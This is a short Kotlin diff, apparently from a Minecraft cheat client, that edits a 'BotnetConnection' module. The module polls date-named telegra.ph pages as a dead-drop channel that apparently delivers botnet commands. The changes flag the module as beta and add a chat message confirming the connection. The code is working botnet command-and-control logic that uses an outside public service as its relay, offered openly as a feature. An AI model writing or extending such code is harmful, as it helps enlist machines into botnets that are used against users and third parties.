@@ -14,9 +14,14 @@ import java.util.*
 
 class BotnetConnection : Module(
     "BotnetConnection",
-    "Connects you into a botnet using telegra.ph service",
+    "Connects you to the botnet using telegra.ph service",
     Category.MISC)
 {
+    override fun isBeta(): Boolean {
+        return true
+    }
+
+
     var wc: WebsiteConnection? = null
     var last_cmd = ""
 
@@ -27,12 +32,14 @@ class BotnetConnection : Module(
 
         when(mode.valEnum) {
             Modes.Optimized -> {
-                // SimpleDateFormat("MM/dd").format(Date())
                 var i = 1
                 while(true) {
                     wc = WebsiteConnection("https://telegra.ph/botnet-input-${SimpleDateFormat("MM/dd").format(Date())}-$i")
                     if(wc!!.checkConnection()) i++
-                    else break
+                    else {
+                        ChatUtils.message("Connected to the botnet ${wc!!.getURL().replace("https://telegra.ph/", "")}")
+                        break
+                    }
                 }
             }
 
